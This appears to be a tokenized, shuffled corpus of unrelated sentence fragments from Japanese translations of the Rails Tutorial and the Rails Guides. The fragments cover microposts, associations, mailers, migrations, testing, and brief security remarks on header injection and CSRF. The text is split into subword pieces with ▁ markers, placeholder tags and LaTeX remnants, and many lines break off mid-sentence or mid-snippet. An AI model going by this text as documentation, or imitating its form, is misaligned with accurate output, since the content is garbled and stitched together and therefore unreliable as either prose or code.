▁\ chapter { ユーザーのマイクロポスト }╼\ label { cha : user _ microposts }╼╼
▁date ▖ end _ of _ hour ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 59 : 59 ▁+0200 ▁2010
▁<%= ▁f ▖ text _ field ▁: comment er ▁%>
▁Cucumber の フィーチャー は非常に 読みやすい のですが 、 その 代 わ り 実装 されている コード から 完全に 切り 離 されて いて 、 両 刃 の 剣 です 。
▁content - type を変更 したい場合は 、`: content _ type ` オプション を指定します 。
▁ こうした 不要な 出力 行 を 除 去 するために 、 バ ッ ク ト レ ー ス を フィルタ します
▁` has _ many ` 関連付け は 、 他の モデルと の 間 に 「 1 対 多 」 の つながり を作成します 。
▁リスト \ ref { code : mail _ account _ activation } で定義した ▁\ k ode { account \_ activation } ▁ の 引数に は 有効な ▁( = 実 在 する ) ▁ユーザー オブジェクトを 渡す 必要がある ため 、 リスト \ ref { code : generated _ user _ mailer _ preview s } は このままでは 動きません 。
▁\ emph { ヒント } : ▁{1} log _ in _ as {/1} ヘルパー を使って リスト { p 2 } に テストを 追加 してみましょう 。
▁self を省略した 結果を リスト \ ref { code : puma _ gemfile } に示します 。
▁[ * object ]
▁client ▁= ▁Client ▖ take (2)
▁ 利用 可能な すべての オプション については 、「 Action ▁Mailer の 全 メソッド 」 セクション で ユーザー 設定 可能な 属性 を参照してください 。
▁( リスト \ ref { code : rails _ command } を実行すると 「 Co ul d ▁not ▁find ▁ ’ railties ' 」 という エラーが表示され る 場合は 、 インストール した Rails のバージョン が正しく ない 可能性があります ▟ リスト \ ref { code : installing _ rails } のとおり に コマンドを実行 した かどうかを 念のため ダブルチェック してください 。
▁( なお 、 リダイレクト によって edit 用の テンプレート が 描画 され なく な った ので 、 リスト \ ref { code : friendly _ forwarding _ test } では 該当する テストを 削除 しています )
▁</ p >
▁この 改 修 が 終 わ ると 、 ▁リスト \ ref { code : home _ view _ interior } 、 リスト \ ref { code : help _ view _ interior } 、 リスト \ ref { code : about _ view _ interior } のように 実に 簡潔 で 美 しい コード になります 。
▁ このコード を使って Micropost モデル を更新し た 結果を 、 リスト \ ref { code : micropost _ ordering } に示します 。
▁リスト { p 0} の {2} @ user {/2} インスタンス変数 使う と 、 編集 ページ が うまく 描画 される ようになります ▁( 図 \ ref { fig : edit _ page }) 。
▁ 新しい パスワード 再設定 画面 ビ ュ
▁### ▁I 18 n オプションで available _ locales リスト の使用 が 強 制 される
▁` Regexp ` の拡張
▁ どちらの 依 存 gem も 、 アプリケーションで ` bundle ▁install ` を実行する ときに インストール されます 。
▁ マイクロポストの ユーザ と の関連付け のテスト 。
▁ これはリスト \ ref { code : user _ factory } で使用されていました 。
▁この レイアウトファイル を有効に するには 、 前述の デフォルトの タイトル 部分を 以下の ERB コード に 差し替え ます 。
▁ INNER ▁JOIN ▁articles ▁ ON ▁articles ▖ category _ id ▁= ▁categories ▖ id
▁% w ( a ▁b ▁c ▁d )▖ from (2) ▁# ▁=> ▁% w ( c ▁d )
▁` Picture ` モデルのインスタンス があれば 、 `@ picture ▖ image able ` と することで 親 を 取得 できます 。
▁has _ many ▁: through 関連付けの 図 ]( images / has _ many _ through ▖ png )
▁上のコードでは 、 この 関数 を 呼んでいます 。
▁リスト \ ref { code : sample _ relationships } は 、 リレーションシップ の サンプルデータを 生成 するための コード です
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁ media : ▁" all " ▁%>
▁> > ▁Rails ▖ env ▖ test ?
▁{0} 図 3▖1 0 ▁{/0}{1} ファイル ナ ビ ゲ ー ター 内の 隠 し ファイル を表示する {/1}
▁ コア チーム は 、 必要に応じて バグ か 機能 か を 審 査 するための 招 集 を かけ る こともあります 。
▁self ▖ class _ eval ▁% {
▁ これはリスト \ ref { code : full _ feed _ test } で使用されていました 。
▁errors ▖ add (: name , ▁" 以下の 文字 を含む ことはできません ▁ !
▁# ▁I gnore ▁all ▁log file s ▁and ▁te mp file s ▖
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / range / include _ range ▖ rb ` です 。
▁self を省略した 結果を リスト \ ref { code : destroy _ forget } に示します 。
▁ 現時点では まだ データベースに データ は 格 納 されていません ▟ つまり 、\ k ode { User ▖ new } は \ emph { メモリ 上で } オブジェクトを 作成した だけで 、\ k ode { user ▖ valid ?} という 行 は ただ オブジェクトが 有効 かどうかを確認 した だけ となります ▁( データベースに データ がある かどうか は 有効 性 には 関係 ありません ) 。
▁ アセット キャッシュストア を 無効 に するには 以下のように します 。
▁\ k ode { C G I ▖ escape HTML } で HTML の エスケープ 処理 を使っている 点 に注目し て 、 な ぜ これが 必要な のか 考え てみてください 。
▁ レシーバ 自体 の キー に対して 破壊的な ブロック 操作 を適用する ` transform _ value s !` メソッド もあります 。
▁ rescue
▁$ ▁c p ▁README ▖ rdoc ▁README ▖ md
▁\ ref { sec : remember _ tests } でも 説明します が 、 この 設計 ▁( および 若 干 の リファクタリング ) ▁ のおかげで 認 証 メ カ ニ ズ ム のテスト が 行い 易 く なります 。
▁ 最終的な サンプルアプリケーション は 、( 偶 然 にも 、 かつ て は Rails で 実装 されて いた ) ▁\ href { http :// twitter ▖ com /}{ 某 ソーシャル マ イ ク ロ ブログ サイト } に と ても よく 似 た 仕 上 が り になります 。
▁作成した エンジン には ` blorgh _ articles ` テーブル と ` blorgh _ comments ` テーブル 用の マイグレーション が含まれます ▟ これらの テーブル を アプリケーションの データベースに 作成し 、 エンジンの モデル から これらの テーブル にアクセス できるように する必要があります 。
▁ 変更 すべき 点 は 、 以下 を
▁< h 1> Edit ing ▁article </ h 1>
▁ 以下のように 変更 してください 。
▁* ▁`: greater _ than ` ▁- ▁ 指定された 値 よりも 大きく なければならない こと を指定します 。
▁ 詳 しく は \ ref { sec : database _ migrations } から 解説します が 、 図 2▖2 \ ref { fig : demo _ user _ model } のユーザー ▁(\ k ode { users } ▁ ) ▁ は データベースの テーブル ▁(\ emph { table }) ▁ に相当 します ▟ また 、 ▁\ k ode { id }、\ k ode { name } 、 ▁\ k ode { email } ▁ の 属性 は それぞれ テーブルの カラム ▁(\ emph { column } : ▁ 列 ) ▁ に相当 します 。
▁CDN が提供する アセット は ネットワーク 上で ブラウザに 近 い 位 置 に あるので 、 リクエスト は 高速 化 されます ▟ また 、 サーバー は アセット の 送信 に 使う 時間 を 節 約 できる ので 、 アプリケーション 本 来 の コードを より 高速 で 提供する ことに 集 中 できます 。
▁#### # ▁` beginning _ of _ week `、` end _ of _ week `
▁`: touch ` オプションを `: true ` に設定する と 、 関連付けられている オブジェクトが 保存 または destroy される たびに 、 そのオブジェクト の ` updated _ at ` または ` updated _ on ` タイムスタンプ が 現在 時刻 に設定されます 。
▁ ヘッダー インジェクション が 実行 可能 になって しま っている 場合 、 レスポンス 分割 ( response ▁ split ting ) 攻 撃 も同様に 実行 可能 になっている 可能性があります 。
▁number _ with _ delimiter ( 12345 6 78 ) ▁# ▁=> ▁12,345,678
▁{0} 図 9 ▖9{/0} {1} ユーザーインデックスページ \ href { http :// localhost :3000/ users }{/ users } に 1 00 人 の サンプルユーザー が表示されている ▟\ href { http :// railstutorial ▖ org / images / figures / user _ index _ all _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁この章では 、 アプリケーションに \ emph { Bootstrap } フレームワーク を 組み込み 、 そして 、 カスタム スタイル を追加します
▁\ ref { sec : remember _ tests } では 、 現在の アプリケーション 設計 では 、 リスト { p 2 } の 統合テスト で 仮 想 の {3} remember _ token {/3} 属性 にアクセス する手段 がない ことを 説明しました 。
▁ バリデーション のいずれか が 失敗する と 、 オブジェクトは 無効 ( invalid ) と マーク され 、 Active ▁Record での ` INSERT ` や ` UPDATE ` 操作 は 行われ ません 。
▁ その後 この リンク は アセットパイプライン によって 利用 可能 になります 。
▁ ある モデル で ` belongs _ to ` 関連付け を行なう と 、 他 方のモデル と の 間 に 「 1 対 1 」 の つながり が設定され ます ▟ このとき 、 宣言 を 行った モデルの すべての インスタンス は 、 他 方のモデル のインスタンス に 「 従 属 ( belongs ▁to )」 します 。
▁( 同じ ことは 、 文字列 と ハッシュ など 、 他の Ruby の データ構造 でも 発生 します ) 。
▁上のコード の結果 は以下のようになります 。
▁ これはリスト \ ref { code : account _ activations _ route } で使用されていました 。
▁ これを行うには \ href { https :// github ▖ com / meta s kill s / mini _ backtrace }{\ text tt { mini \_ backtrace } } ▁gem ▁( リスト \ ref { code : gemfile _ sample _ app }) ▁ と \ emph { backtrace ▁ silencer } を 組み合わせ ます 。
▁\ ref { sec : a _ test _ for _ invalid _ submission } で 書いた 無効な 送信 に対するテスト と同様に 、 今回 の目的は データベースの 中 身 が 正しい かどうか 検証 することです 。
▁ 表 \ ref { table : password _ token _ digest } に 両者 の 似 ている 点 を示します ▁(\ ref { sec : password _ reset } の パスワード 再設定 も 含 む ) 。
▁ 以下 を 計算 します 。
▁これ に対応する アプリケーションコード は 、 Users コントローラの \ k ode { edit } アクション の中に 書き込み ます 。
▁ xhr ▁: get , ▁: index , ▁format : ▁: js
▁たとえば 、 以下のように 文字列 を含む 配列 が あるとします 。
▁この コマンド により 、 プロジェクト の ファイルは 、 コミット 待 ち の 変更 が 格 納 されている 「\ emph { ステージング エリア }」 という 一種の 待 機 場所 に追加されます ▟ ステージング エリア にある ファイルの リスト を表示する には 、\ k ode { status } コマンドを実行 します
▁\ text tt { Gemfile } に \ k ode { will _ paginate } を追加する
▁m attr _ accessor ▁: history
▁$("# new _ article ")▖ append ▁"< p > ER R O R </ p > "
▁次の 部分 には ハッシュ があります 。
▁* ▁Rails ▁4▖0 の ` ActiveModel :: Seri al ize rs :: JSON ▖ include _ root _ in _ json ` のデフォルト 値が ` false ` に 変更 されました 。
▁たとえば 、 css アセット ファイルに ` erb ` という 拡張子 を追加する と ▁( ` application ▖ css ▖ erb ` など ) 、 CSS ルール 内で ` asset _ path ` などの ヘルパー が 使用 できるようになります 。
▁第 1 章 の最後 には 、 作成した アプリ を 早 々 に 本番 ▁( production ) ▁ 環境 ▁(\ ref { sec : deploying }) ▁ に \ emph { デプロイ して 一 般 公開 する } ところ まで 実 践 します 。
▁その 理由 については 第 \ ref { cha : modeling _ users } 章 で説明します ) 。
▁ クラウド IDE を ご 利用 の場合は 、 オ ス ス メ の i rb の設定 があります 。
▁従って 、 特定の 文字列 に対して ` html _ safe ` メソッドを呼び出す 際に は 、 その 文字列 が 本当に 安全 である ことを確認する 義 務 があります 。
▁* ▁ 特定の レコード が存在する かどうか をチェックする
▁### ▁ ルーティング をテストする
▁[ user ] ▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" 8 45 6 "
▁ サンプル データ 生成 コード に 管理者 を 1 人 追加する
▁=> ▁Object
▁この キャッシュ は スレッド セ ー フ ではありません 。
▁最後に \ ref { sec : adding _ page _ title s } のテスト を実行して 、 タイトル を 壊 していない ことを確認します 。
▁\ k ode { {1} リスト ▁3 ▖ 6 {/1} } の {2} class {/2} という キーワード から 、 {2} static _ pages _ controller ▖ rb {/2} は {2} StaticPages Controller {/2} という \ emph { クラス } を定義し ている ことがわかります 。
▁上のコードは 、 デ コ レ ー タ だけ ではなく 、 メ イン の アプリケーション から 参 照 されない すべての エンジンの コードを 読み込み ます 。
▁ Comment モデル の内容は 、 これまで に 見た ` Article ` モデルと 非常に よく 似 ています 。
▁default ▁from : ▁" from @ example ▖ com "
▁user ▖ name ▁= ▁" David "
▁< option ▁value =" 4 "> R w and a </ option >
▁ それ により 、` rake ▁assets : precompile ` が 実行 された ときに エンジンの アセット を追加する よう sprockets に 指示 されます 。
▁C ▖ subclasses ▁# ▁=> ▁[ B ]
▁second : ▁two
▁ マイグレーション は Ruby の クラス であり 、 データベース テーブル の作成 や 変更 を簡単に 行う ための しく み です 。
▁REST アーキテクチャ に 初めて 触れ た
▁### ▁Date Helper
▁#### ▁ strip _ tags ( html )
▁# ▁ リレーション 経 由
▁ここでは Rails コンソール のように コマンド を呼び出す ことができ て 、 アプリケーションの 今 の状態 を確認する ことができます 。
▁ Missing ▁template ▁articles / new , ▁application / new ▁with ▁ { locale : [: en ] , ▁format s : [: html ] , ▁handle rs : [: erb , ▁: builder , ▁: coffee ]} ▖
▁ここでは \ k ode { xhr } メソッド ▁( “ XmlHttpRequest ” ▁ の 略 です ) ▁ を使用して Ajax リクエストを 発行し ています ▟ 以前の 、\ k ode { get }、\ k ode { post }、\ k ode { patch }、\ k ode { delete } メソッド を使用した テスト と 比 べ てみてください 。
▁* = ▁require ▁layout
▁ Response ヘッダー には 、 たとえば ステータスコード 、 Cookie フィールド 、 Location フィールド ▁( リダイレクト 先 を表す ) ▁ があります 。
▁Client ▖ limit (1) ▖ pluck (: name )
▁ただし さ さ い な ことで は あります が 、 マイクロポストの 投 稿 が \ emph { 失敗する } と 、 ▁Home ページ は \ k ode {@ feed \_ items } インスタンス変数 を 期 待 している ため 、 現 状 では 壊 れ てしまいます 。
▁` association ` メソッドは 関連付けられたオブジェクト を返します 。
▁ 適用 する CSS クラスを メッセージ の種類 によって 変更 する ようにしています ▟ これにより 、 たとえば \ k ode { : success } キー の メッセージ が表示される 場合 、 適用 される CSS クラスは 次のようになります 。
▁ バージョン 情報を 確認してください 。
▁< optgroup ▁ label =" As ia ">
▁この節では 、 アカウント有効化 の 統合テスト を追加します 。
▁ テストの 結果を 図 \ ref { fig : riding _ rails _ environment } に示します 。
▁c 2 ▁= ▁Client ▖ find (1)
▁この クラス の設定 を カスタマイズ 可能 に するには 、 エンジン 内部 に ` author _ class ` という名前の 設定 が必要です ▟ この 設定 は 、 親 アプリケーション 内部で ユーザー を表す クラス が ど れ である か を指定する ためのものです 。
▁ 正しく 関連付け が でき たら 、 リスト { p 0} の {2} setup {/2} メソッドを 修正 して 、 慣習 的に 正しく マイクロポストを 作成 してみます ▁( リスト \ ref { code : micropost _ validity _ test _ idiomatic }) 。
▁` params [: token ]` が ` [ ] `、` [ nil ] `、` [ nil , ▁nil , ▁▖▖▖ ] `、` [' foo ', ▁nil ]` のいずれか の場合 、` nil ` チェック を パス する にもかかわらず 、 where 句 が ` IS ▁NULL ` または ` IN ▁( ' foo ', ▁NULL ) ` になって SQL クエリ に 追加 されてしまいます 。
▁ バージョン を指定して Rails をインストール する 。
▁これで テストスイート が パス する ようになりました が 、 実は before フィルター の実装 はまだ 終 わ っ ており ません ▟ セキュリティ モデル に関する 実装 を 取り 外 しても テストが ▁\ passing ▁ になっ てしまう かどうか 、 実際に コメントアウト して 確かめ てみましょう ▁( リスト \ ref { code : comment ed _ out _ before _ filter }) 。
▁ アカウント有効化 の 際 と 似 て いて 、 Password Re set s リソース を作成して 、 再設定 用の トークン と それに対応する ダイジェスト を保存する のが 今回の 目的 となります ▟ 全体 の 流れ は 以下の とおり です 。
▁` render ` メソッドは 、 メソッド呼び出し の 際に `: inline ` オプション を使用して ERB を与える と 、 ビュー が まったく ない 状態 でも 実行 することができます 。
▁middleware s ▁<< ▁[ :: Rack :: Content Length ]
▁$ ▁rails ▁destroy ▁controller ▁ FooBar s ▁ baz ▁ q u u x
▁` false ▖ present ?` は 常に false なので 、 真 偽 値 に対して この メソッドを使用すると 正しい 結果 が 得 ら れ ません ▟ 真 偽 値が 存在しない ことを チェック したい場合は 、` validates ▁: field _ name , ▁ exclusion : ▁ { ▁in : ▁[ true , ▁false ] ▁}` を使用する必要があります 。
▁invoke ▁ css
▁[] ▖ append ( [ 1, 2 ]) ▁# ▁=> ▁[[1, 2 ]]
▁self を省略した 結果を リスト \ ref { code : signup _ flash } に示します 。
▁以前のバージョン の Rails であれば 、 このような 実装 を行う ための コードは 現在の 倍 以上 になって いた ことでしょう ▟ しかし 今 では コンパクト な ▁\ k ode { validates } メソッドと \ k ode { has _ secure _ password } メソッド のおかげで 、 ほんの 数 行 の コードを書く だけで 完全な User モデル を作成 できるようになりました 。
▁デフォルトでは 、 ルート 要素 の名前 は 最初の 要素 の クラス名 を 複数形 に して アンダースコア 化 ( un d ers c or ize ) と ダ ッ シ ュ 化 ( dasherize ) を行います ▟ 残 り の 要素 も 最初の 要素 と同じ 型 ▁( ` is _ a ?` で チェック されます ) ▁ に 属 し 、 ハッシュ でない ことが 前提と なっています 。
▁次の ページ で 右 上 隅 の ▁[ New ▁pull ▁request ] ▁ を 押 します 。
▁ これはリスト \ ref { code : password _ tests } で使用されていました 。
▁ category ▖ articles ▖ created _ before ( time )
▁ そ の他に 、 一 定 時間 が 経 過 すると セッションを 期限切れ にする モデル もあります 。
▁Date ▖ new (201 0, ▁2, ▁28 )▖ advance ( day s : ▁1) ▖ advance ( months : ▁1)
▁ 以下のコマンドを実行し て 解決 します 。
▁` beginning _ of _ minute ` は ` at _ beginning _ of _ minute ` の別名 です 。
▁#< Client ▁id : ▁2, ▁first _ name : ▁" Fi fo "> ,
▁mail ( to : ▁@ user ▖ email ,
▁ 値が ` nil ` や 空 文字 である ▁( つまり 空欄 または ホワイトスペース である ) ▁ かどうかを確認 するために 、 内部で は ` present ?` メソッド を使用しています 。
▁' Head er - Name ' ▁=> ▁' Head er - V al ue ',
▁ ところで 、 Heroku の デプロイ するとき 、 も しかし たら 次のような 警 告 メッセージ を 目 にした こと がある かもしれません 。
▁E O T
▁email ▖ attachments ▖ each ▁do ▁| attachment |
▁ 先 の例 の場合 、` welcome _ email ` メソッド で使用する メイラー ビュー は 、 HTML 版 であれば ` app / views / user _ mailer / welcome _ email ▖ html ▖ erb ` が使用され 、 プ レ ー ン テキスト であれば ` welcome _ email ▖ text ▖ erb ` が使用されます 。
▁ この節 の冒頭 で データベースをリセットし て あるので 、 現時点では \ k ode { User ▖ count } は \ k ode {0} になっています 。
▁Article ▖ find (10) ▖ comments ▖ re order (' name ')
▁( 図 \ ref { fig : profile _ mockup } では 、 有名な \ emph { lo re m ▁ ip sum } ダ ミ ー テキスト を使用しています ▟ この テキスト の 成り立 ち には \ href { http :// www ▖ str a ight do pe ▖ com / columns / read / 22 9 0 / what - does - the - fi ll er - text - lo re m - ip sum - me an } { 面 白 い エ ピ ソ ー ド } が あるので 機 会 があり ました ら どう ぞ ▟)
▁\ k ode { remember \_ digest } は User モデルの 属性 であり 、 モデル 内で は以下のように 書き 換 え ることができます 。
▁以下は 述 語 の例 です 。
▁さらに 、 Rails では 以下のような コード では \ emph { 名前付きルート } を使用する のが 慣例 と なっています 。
▁ユーザー インデックス の ページネーション 。
▁ 本書 の チュートリアル を 進 めて い く うちに 何か 問題が生じ たら 、\ href { http :// railstutorial ▖ org / help } { Rails チュートリアル の Help ページ } を読んでみてください ▟ この ページ には 問題 を解決する ための リソース や ヒント が 記載 されているので 、 問題 を解決する 手 掛 か り になるはずです
▁"#{ active _ record ▖ name ▖ demodulize ▖ underscore ▖ pluralize } _ count "
▁ オーナー オブジェクトが destroy された 時に 、 それ に 関連付けられたオブジェクト を どう するか を 制御 します 。
▁class ▁ Engine ▁< ▁ :: Rails :: Engine
▁( メール が 見え る まで 多少 ス ク ロー ル が必要 でしょう ) 。
▁validate ▁do ▁| person |
▁{0} 図 9 ▖7{/0}{1} ページネーション と ▁[ Users ] ▁ リンク を実装 した ユーザーの インデックス ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / user _ index _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁options [" type "] ▁= ▁" checkbox "
▁ テーブル を 実際に 作成する には ` rake ▁db : migrate ` を実行します ▟ ロールバック するには ` rake ▁db : rollback ` を実行します 。
▁ここで 、 生の パスワード ではなく 、 暗号化 された パスワード 同士 を 比 較 し ていることに注目してください ▟ こうすることで 、 生の パスワード をデータベースに保存する という 危 険 な ことを し なくても ユーザーを 認 証 できます 。
▁` app / views / welcome / index ▖ html ▖ erb ` を開いて 以下のように 変更 してください 。
▁Rails は 複数の キー インデックス をサポートしてい る
▁class ▁User Mailer ▁< ▁Application Mailer
▁ 実際には 、 以下の 同等の コードを
▁email : ▁params [: email ])
▁| ▁| ▁40 3 ▁| ▁: for b id d en ▁|
▁ このような コード がある場合 は 、 以下のように 書き 換 え なければなりません 。
▁( すべての ユーザーを 一 気 に 読み 出 す と データ 量 が多い 場合に 問題が生じ る のではないかと 思 わ れ た 方 、 その とおり です ▟ この キ ズ は \ ref { sec : pagination } で 修正 します ▟)
▁ クラス 自身 が 使用されている と 、 Rails はその クラスを 読み 込 んで 関連する テーブル を参照 し よう とします 。
▁次に 、 フォロー 用 と フォロー解除 用の フォーム を作成します ▟ それ から 、 フォローしているユーザー と フォロワー の一覧を表示 する 専 用の ページ を作成します 。
▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ',
▁c 2▖ name ▁= ▁" should ▁fail "
▁ 本当に JavaScript を リモート の ` < script >` タグ から 読み込む のであれば 、 その アクション では CSRF 保 護 を スキップ してください 。
▁このメソッドは スコープ をすべて 解除 し 、 テーブル に対して 通常の ▁( スコープ な し の ) ▁ クエリ を実行する ようにします 。
▁ 名前付き パラメータ を持つ ルーティング に プレフィックス を追加する こともできます 。
▁# ▁Use ▁CoffeeScript ▁for ▁ ▖ js ▖ coffee ▁assets ▁and ▁views
▁require ▁' active _ support / core _ ext / object / blank '
▁JavaScript ランタイム が インストール されていない という エラーが表示され た場合 は 、\ href { https :// github ▖ com / s s te phens on / execjs } { GitHub の execjs ページ } にある インストール 可能な ランタイム の 一覧 から JavaScript ランタイム を 入 手 してください 。
▁=> ▁" 3 ▁ er r at a "
▁user _ name : ▁' < ユーザー名 > ',
▁たとえば データベースの 内部 エンコード が L at in - 1 になっている と 、 ロ シ ア 語 ・ ヘ ブ ラ イ 語 ・ 日本語 などの 文字 を データベースに保存 したときに これらの 情報 は 永 久 に 失われ てしまいます 。
▁< h 1> Product s </ h 1>
▁ では 、 サンプルユーザー を生成する Rake タスク を追加 してみましょう ▟ Rails では \ k ode { db / seed s ▖ rb } という ファイルを 標準 として 使い ます 。
▁さらに 読みやすい 別の 方法 として 、 ハッシュ 条件 を ネスト させる 方法があります 。
▁ ソース の ファイル名 に 拡張子 ` ▖ css ` がない場合 は自動的に 補 われます 。
▁ 事前 設定 済み の クラウド 環境 を利用する ことで 、 Rails のインストール 、 アプリケーションの 生成 、 生成された ファイルの 編集 を簡単に 行う ことができる 。
▁ 本書 では 、 あらゆる 手順 が ▁Rails ▁ 流 で 行われ ています ▟ 最初の う ち は 慣 れる まで に 時間 が か か りました が 、 この 本 を 終 え た 今 、 ついに これ こ そ が 自然な 方 式 だと 感じ られる まで になりました 。
▁#### ▁` assert _ recognizes ` アサーション
▁ リンク テキスト を 残 して リンク タグ をすべて 削除します 。
▁たとえば 、 モデル のテスト 用に ` test / models ` ディレクトリ を作成 しても構いません 。
▁この 構 文 を コンソール で 確かめ てみましょう 。
▁\ ref { sec : user _ micropost _ associations } の マイクロポストの ときと同様 、 以下のような ユーザー 関連付け のコード を使用して 新しい リレーションシップ を作成します 。
▁ アプリケーションのルート パス を省略 して 、 単 純 に \ k ode { config / routes ▖ rb } と 表 記 する ことにします 。
▁resources ▁: quot es
▁従って 、 関連付け 名 が 誤 って 複数形 になって しま っている と 、 そこ から 推 測 される クラス名 も 誤 って 複数形 になってしまいます 。
▁上のように 、 Rails には \ text tt { Rails } という オブジェクト があり 、 それ には 環境 の 論理値 ▁( boolean ) ▁ を 取 る \ text tt { env } という 属性 があります ▟ たとえば 、\ text tt { Rails ▖ env ▖ test ?} は テスト 環境では \ text tt { true } を返し 、 それ以外の 環境では \ text tt { false } を返します 。
▁ ついに Rails アプリケーションを 最 後 まで 完成 させ ました 。
▁[ API ドキュメント ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers ▖ html ) ▁ も 参 照 して 調 べ 直 す ことをお勧めします ▟ API ドキュメント には すべての ヘルパー の詳細 が 記載 されており 、 本ガイド は 概 要 を 把 握 する ためのものです 。
▁ マイクロポスト を新規作成する アクション
▁ 動作 の詳細 を知り たい場合は 、 Stack ▁Overflow の \ href { http :// stack overflow ▖ com / questions / 9 4 1 59 4/ understand - rails - authenticity - token } { Rails 信 頼 性 トークン 関連の 書き込み ▁( 英語 )} ▁ を参照してください 。
▁最後に 、 ステータスフィード の 完成 版 を 実装します ▁(\ ref { sec : the _ status _ feed }) 。
▁format ▖ html
▁\ ref { sec : signup _ form } の冒頭 で データベースをリセットし て あるので 、 現時点では \ k ode { User ▖ count } は \ k ode {0} になっています 。
▁ ユーザー表示ページ に Gravatar のデフォルト 画像 が表示されている
▁: set _ business _ headers
▁Rails のコード に 貢献 する
▁ここでは 、\ k ode { String } クラスの ス ー パ ー クラスは \ k ode { Object } クラス で 、\ k ode { Object } クラスの ス ー パ ー クラスは \ k ode { BasicObject } クラス ですが 、 ▁\ k ode { BasicObject } クラスは ス ー パ ー クラスを 持 た ない ことがわかります 。
▁> > ▁p ▖ errors ▖ messages
▁ 上で 簡潔 に 述べたように 、 Rails は データ を保存する 際に デフォルトで リ レ ー シ ョ ナ ル データベース を使用します ▟ リ レ ー シ ョ ナ ル データベース は 、 データ \ emph { 行 } で 構成 される \ emph { テーブル } から なり 、 各 行 は データ 属性 の \ emph { カラム } ▁( 列 ) ▁ を持ちます 。
▁ 能動的関係 を と お して フォローしているユーザー を取得する 模 式 図
▁ここで 行われている リダイレクト は 、 HTTP ステータス で言う 「 30 1 ▁" Mo ve d ▁P er man ent ly " 」 である ことにご注意ください 。
▁ 実は す で に 、 リスト { p 0} の {2} Gemfile {/2} で \ text tt { guard } ▁gem を アプリケーション 内に 取り 込 んで います ▟ したがって 、 あ とは 初期化 するだけで 動 か す ことができます 。
▁User モデル のとき と同じ で 、 Micropost モデルの マイグレーション ファイル でも \ k ode { t ▖ timestamp s } という 行 ▁( マジックカラム ) ▁ が自動的に 生成 されています ▟ これにより 、 ▁\ ref { sec : database _ migrations } で 説明したように \ k ode { created \_ at } と \ k ode { updated \_ at } という カラム が追加され ます ▁( 図 ▁\ ref { fig : micropost _ model }) 。
▁Active ▁Support では 、 この 他にも 便利な ハッシュの マージ をいくつか 提供し ています 。
▁ パスワード再設定の フォーム
▁図 \ ref { fig : user _ has _ many _ following } を見 て いて 気付いた方もいると思います が 、 フォロワー の配列 を 展開 するために必要な 情報 は 、\ k ode { relationships } テーブルに 既に あります
▁ マイクロポスト を新規作成する ページ
▁belongs _ to ▁: author
▁-------------- ---------------- ---------------- ---------------- ----------------
▁Rails の カスタム 環境 については [ Rails 環境 を作成する ]( configuring ▖ html # rails 環境 を作成する ) を参照してください 。
▁* ▁` config ▖ active _ record ▖ timestamp ed _ migrations ` は 、 マイグレーション ファイル名 に シ リ ア ル 番号 と タイムスタンプ のどちら を与える か を指定します 。
▁図 \ ref { fig : user _ model _ remember _ digest } の データモデル を アプリケーション に追加する ために 、 以下の マイグレーション を生成します 。
▁ 以下のように コンテンツ タイプ を 指定 できる ため 、 文字列 ベースの コンテンツ 表示 には これらの オプション の使用 が 推 奨 されます ▟ ╼
▁### ▁ 文字列 からの コンテンツ 描 出
▁そこで 、\ k ode { Word } クラス を作成し 、 その中に 、 ある 単語 を 前 から と 後 ろ から のどちら から 読んで も 同じ ▁( つまり 回 文 になっている ) ▁ なら ば \ k ode { true } を返す \ k ode { palindrome ?} メソッド を作成し てみましょう 。
▁ すべての 数値 は 、 以下の メソッドに 応答 します 。
▁ 本番 運 用 する アプリケーションでは 、 暗号化 されていない ID や パスワード のような 重要な セキュリティ 情報 は 「 絶対に 」 ソースコード に 直接 書き 込 ま ないでください ▟ そのような 情報 は 環境変数 に記述 し 、 そこ から アプリケーションに 読み込む 必要があります 。
▁{0} 図 7 ▖ 17 {/0} ▁{1} ユーザー登録 失敗 時の エラーメッセージ {/1}
▁リスト \ ref { code : db _ seed } のコード では 、 Example ▁User という 名前とメールアドレス を持つ 1 人 の ユーザ と 、 それら しい 名前とメールアドレス を持つ 99 人のユーザー を作成します 。
▁ ツール の 組み合わせ は 各 人 の 好 み や プラットフォーム によって 変 わ って きます が 、 著者 が お勧め する ツール を 以下 に ご しょう か い しま s
▁もちろん 、 実際に ブラウザ を 起動 して 、 テスト が正しく 動いている かどうかを 確かめ ることもできます ▁({0}{1} 図 3 ▖ 5 {/1}{/0} ) 。
▁email _ field (: user , ▁: email )
▁ここで もう 1 つ 微 妙 な 点を 指 摘 しておきたい と思います ▟ リスト \ ref { code : user _ edit _ view } の \ k ode { form \_ for (@ user )} のコードは 、 リスト \ ref { code : signup _ form } のコード と \ emph { 完全に } 同じです ▟ だと すると 、 Rails は どうやって 新規ユーザー 用の \ text tt { POST } リクエスト と ユーザー 編集 用の \ text tt { PATCH } リクエストを 区別 する のでしょうか 。
▁Date ▖ new ( 1582 , ▁10 , ▁4 ) ▁+ ▁1▖ day
▁has _ and _ belongs _ to _ many ▁: r ol es
▁' X - Frame - Options ' ▁=> ▁' S A M E O R I G IN ',
▁#### ▁ 「 浅 い 」 ネスト
▁ クラウド IDE で Rails サーバー を実行する 。
▁ 更新 時に 特定の タイムスタンプ 属性 を指定することもできます 。
▁( リスト \ ref { code : test _ helper _ log _ in } で定義した デフォルト オプション と 比 較 してみてください ▟)
▁ 通常 、 親 リポジトリ は \ emph { master } ブランチ と呼ばれ 、 トピックブランチ ▁( 短 期間 だけ 使う 一時 的な ブランチ ) ▁ は \ k ode { checkout } と \ k ode { - b } フラグ を使って 作成 できます 。
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁DESC ▁LIMIT ▁1
▁Contact ページの ルート を追加する ▁( ▁\ failing ▁ )
▁ テスト が正しく 失敗した ので 、 今度は ユーザー登録 の \ emph { フォーム } を作成して テストにパス する ようにしましょう 。
▁Active ▁Support では 、` String # start _ with ?` と ` String # end _ with ?` を 英語 的に 自然な 三 人 称 ( start s 、 end s ) にした 別 名 も 定義 して あります 。
